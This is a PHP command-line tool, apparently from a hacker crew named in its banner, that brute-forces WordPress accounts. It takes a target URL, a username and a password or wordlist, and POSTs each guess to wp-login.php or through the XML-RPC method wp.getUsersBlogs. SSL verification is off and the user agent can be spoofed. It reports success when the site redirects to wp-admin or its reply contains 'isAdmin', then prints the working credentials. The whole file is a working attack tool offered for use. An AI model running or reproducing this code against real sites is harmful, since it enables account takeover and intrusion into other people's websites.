#!/usr/bin/env php
<?php
/*

CodeX : RandsX

*/
set_time_limit(0);
define("file", $argv[0]);
$param_1 = "t:u:p:l:g:h";
$param_2 = array("target:", "user:", "pass:", "list:", "timeout:", "help", "user-agent:");
define("get", getopt($param_1, $param_2));
define("swipe", (PHP_OS == "Linux") ? @exec("clear") : @exec("cls"));
//var_dump(get); die;
class Xploit {

    public $yellow = "\e[1;33m",
    $white = "\e[1;37m",
    $green = "\e[1;32m",
    $red = "\e[1;31m";

    private $host = get["t"] ?: get["target"];
    private $user = get["u"] ?: get["user"];
    private $pass = get["p"] ?: get["pass"];
    private $list = get["l"] ?: get["list"];
    private $ua = get["g"] ?: get["user-agent"];

    protected $type = null;

    public function __construct() {
        print swipe;
        $parse = parse_url($this->host);
        $this->type = basename($parse["path"], ".php");
        $this->banner();

        if ((isset(get["h"]) && get["h"] == false) || (isset(get["help"]) && get["help"] == false)) {
            $this->_usage(); die;
        } elseif (empty(get)) {
            $this->_usage(); die;
        } else {
            $this->checkHost();
            $this->checkUser();
            $this->checkPassOrList();
        }

        $dirs = getcwd() . "/" . $this->list;
        $list = @file_get_contents($dirs);
        if ($list) {
            print "\n[".$this->yellow."*".$this->white."] Checking wordlist\n";
            sleep(2);
            print swipe;
            $this->banner(); print "\n";
            $this->pass = explode("\n", $list);
        }

        if (is_array($this->pass)) {
            foreach ($this->pass as $pass) {
                if ($this->cURL($pass) == true) {
                    $this->true($pass); break;
                } else {
                    print "[".$this->red."!".$this->white."] => $pass \n";
                }
            }
        } else {
            print "\n";
            if ($this->cURL($this->pass) == true) {
                $this->true($this->pass);
            } else {
                print "[".$this->red."ERROR".$this->white."] => Not Logged with password ".$this->yellow.$this->pass.$this->white." \n";
            }
        }
    }

    public function banner() {
        print $this->yellow."
 _       __      ____  ____
| |     / /___  / __ )/ __/
| | /| / / __ \/ __  / /_
| |/ |/ / /_/ / /_/ / __/
|__/|__/ .___/_____/_/
      /_/ ".$this->green."Wordpress Brute Force".$this->white.(($this->type == null)?"\nAuthor : RandsX@22XploiterCrew":" - ").$this->yellow.(($this->type == "xmlrpc") ? $this->type." login" : $this->type)."\n".$this->white;
    }

    private function checkHost() {
        if (empty($this->host)) {
            $this->_usage();
            die("[".$this->red."!".$this->white."] Target can't be empty\n");
        }
    }
    private function checkUser() {
        if (empty($this->user)) {
            $this->_usage();
            die("[".$this->red."!".$this->white."] User can't be empty\n");
        }
    }
    private function checkPassOrList() {
        if (empty($this->pass) && empty($this->list)) {
            $this->_usage();
            die("[".$this->red."!".$this->white."] Password can't be empty\n");
        }
    }

    protected function _usage() {

        print "\nUsage : php ".file." [Argument] [Value]\n";
        $this->args();
    }

    protected function args() {
        $title = array(
            $this->green . "Argument",
            $this->yellow . "\tDescription" . $this->white
        );

        print "\n".$this->table(array($title,
            ["-h  --help", "Show all commands"],
            ["-t  --target", "Insert target URL"],
            ["-u  --user", "Insert user target"],
            ["-p  --pass", "Insert password target"],
            ["-l  --list", "Insert list password"],
            ["-g  --user-agent", "Set User Agent browser"],
        ))."\n";
        print $this->yellow."NOTE : This tool auto detect your want type brute force".$this->white." \n";
    }

    protected function table($data, $is = true) {

        // Find longest string in each column
        $columns = [];
        foreach ($data as $row_key => $row) {
            foreach ($row as $cell_key => $cell) {
                $length = strlen($cell);
                if (empty($columns[$cell_key]) || $columns[$cell_key] < $length) {
                    $columns[$cell_key] = $length;
                }
            }
        }

        // Output table, padding columns
        $table = "";
        foreach ($data as $row_key => $row) {
            foreach ($row as $cell_key => $cell)
            $table .= str_pad($cell, $columns[$cell_key]) . (($is == false) ? "\t" : "\t");
            $table .= PHP_EOL;
        }
        return $table;

    }

    public function true($pass) {
        print swipe;
        $this->banner();
        print "\n";
        print $this->green."Success LogIn";
        $title = array(
            $this->yellow . "Username",
            $this->yellow . "Password" . $this->white,
        );

        print "\n".$this->table(array($title,
            [$this->user, $pass],
        ), false)."\n";
        print "Host : ".$this->host."\n";
    }

    public function cURL($pass) {
        if ($this->type == "xmlrpc") {
            $params = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$this->user</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>";
        } else {
            $params = "log=".$this->user."&pwd=".$pass;
        }

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->host,
            CURLOPT_POST => TRUE,
            CURLOPT_POSTFIELDS => $params,
            CURLOPT_SSL_VERIFYPEER => FALSE,
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_USERAGENT => $this->ua ?: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15",
            CURLOPT_COOKIESESSION => TRUE,
            CURLOPT_COOKIEJAR => $this->host . ".log",
            CURLOPT_COOKIEFILE => $this->host . ".log",
            CURLOPT_RETURNTRANSFER => TRUE,
        ]);
        $curl = curl_exec($ch);
        $info = curl_getinfo($ch);

        if (stristr(($this->type == "xmlrpc") ? $curl : $info["url"], ($this->type == "xmlrpc") ? "<name>isAdmin</name>" : "wp-admin")) {
            return true;
        }
    }
}

$run = new Xploit;
